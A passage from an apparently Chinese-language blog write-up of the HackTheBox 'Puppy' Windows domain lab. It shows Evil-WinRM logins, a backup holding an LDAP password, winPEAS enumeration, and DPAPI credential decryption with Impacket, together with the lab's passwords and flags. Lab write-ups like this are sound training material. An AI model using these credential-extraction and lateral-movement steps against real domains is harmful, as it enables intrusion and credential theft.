successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再使用 \u003ccode\u003ewinrm\u003c/code\u003e 进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nbc5937245feb2b2c7101f1a54c4ecf4a\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e寻找一下信息\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ebackups\u003c/code\u003e 目录下有一个压缩包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Backups\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip\n\n*Evil-WinRM* PS C:\\Backups\u003e download site-backup-2024-12-30.zip\nInfo: Downloading C:\\Backups\\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip\n                                        \nInfo: Download successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解压后能找到一个文件 \u003ccode\u003enms-auth-config.xml.bak\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?xml version=\u003cspan class=\"hljs-string\"\u003e\"1.0\"\u003c/span\u003e encoding=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e?\u003e\n\u0026#x3C;ldap-config\u003e\n    \u0026#x3C;server\u003e\n        \u0026#x3C;host\u003eDC.PUPPY.HTB\u0026#x3C;/host\u003e\n        \u0026#x3C;port\u003e389\u0026#x3C;/port\u003e\n        \u0026#x3C;base-dn\u003edc=PUPPY,dc=HTB\u0026#x3C;/base-dn\u003e\n        \u0026#x3C;bind-dn\u003ecn=steph.cooper,dc=puppy,dc=htb\u0026#x3C;/bind-dn\u003e\n        \u0026#x3C;bind-password\u003eChefSteph2025!\u0026#x3C;/bind-password\u003e\n......\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eTo Steph.cooper_adm\u003c/h2\u003e\n\u003cp\u003e里面是 \u003ccode\u003esteph.cooper\u003c/code\u003e 的密码，使用\u003ccode\u003eHoundBlood\u003c/code\u003e查看一下其信息\u003c/p\u003e\n\u003cp\u003e注意到 \u003ccode\u003esteph.cooper\u003c/code\u003e 属于 \u003ccode\u003ePUPPY ADMINS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且 \u003ccode\u003esteph.cooper\u003c/code\u003e 也是属于远程管理组的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003ewinrm\u003c/code\u003e 进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传 \u003ccode\u003eWinpeas\u003c/code\u003e 进行信息收集\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\steph.cooper\\documents\u003e ./winPEAS.exe \u003e result.txt\n*Evil-WinRM* PS C:\\Users\\steph.cooper\\documents\u003e download result.txt\n                                        \nInfo: Downloading C:\\Users\\steph.cooper\\documents\\result.txt to result.txt                                       \nInfo: Download successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eDPAPI\u003c/h3\u003e\n\u003cp\u003e经过提示说要使用 \u003ccode\u003eDPAPI\u003c/code\u003e ，并且在 \u003ccode\u003eWinpeas\u003c/code\u003e 中也能扫描到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e首先将 \u003ccode\u003eDPAPI\u003c/code\u003e下载下来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再下载受 \u003ccode\u003eDPAPI\u003c/code\u003e 保护的数据的隐藏文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e获取解密密钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password \u003cspan class=\"hljs-string\"\u003e'ChefSteph2025!'\u003c/span\u003e\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[MASTERKEYFILE]\nVersion     :        2 (2)\nGuid        : 556a2412-1275-4ccf-b721-e6a0b4f90407\nFlags       :        0 (0)\nPolicy      : 4ccf1275 (1288639093)\nMasterKeyLen: 00000088 (136)\nBackupKeyLen: 00000068 (104)\nCredHistLen : 00000000 (0)\nDomainKeyLen: 00000174 (372)\n\nDecrypted key with User Key (MD4 protected)\nDecrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用解密密钥解密搜保护的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[CREDENTIAL]\nLastWritten : 2025-03-08 15:54:29\nFlags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)\nPersist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)\nType        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)\nTarget      : Domain:target=PUPPY.HTB\nDescription : \nUnknown     : \nUsername    : steph.cooper_adm\nUnknown     : FivethChipOnItsWay2025!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到 \u003ccode\u003esteph.cooper_adm\u003c/code\u003e 的密码 \u003ccode\u003eFivethChipOnItsWay2025!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003eevil-winrm\u003c/code\u003e 登录即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy evil-winrm -i 10.10.11.70 -u steph.cooper_adm -p FivethChipOnItsWay2025!\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\steph.cooper_adm\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\administrator\\desktop\u003e \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt\n1e994f1731e5342bb080a9b7eea4f1a6\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e第一次打没有 \u003ccode\u003eWeb\u003c/code\u003e 的靶机，涉及到的新知识点也很少。这还是第一次是使用\u003ccode\u003eDPAPI\u003c/code\u003e ，这次也将其作了解了。\u003c/p\u003e","title":"HackTheBox - Season8 - Puppy","date":"2025-05-19","updated":"2025-05-19","tags":["HackTheBox","Windows靶机","域渗透","DPAPI","Keepass","encrypt"],"categories":"靶机","comments":true,"isEncrypted":true}},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"05","day":"19","id":"HackTheBoxSeason8 - Puppy"},"buildId":"TQkCFKbomQ5ZAXR97drm1","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>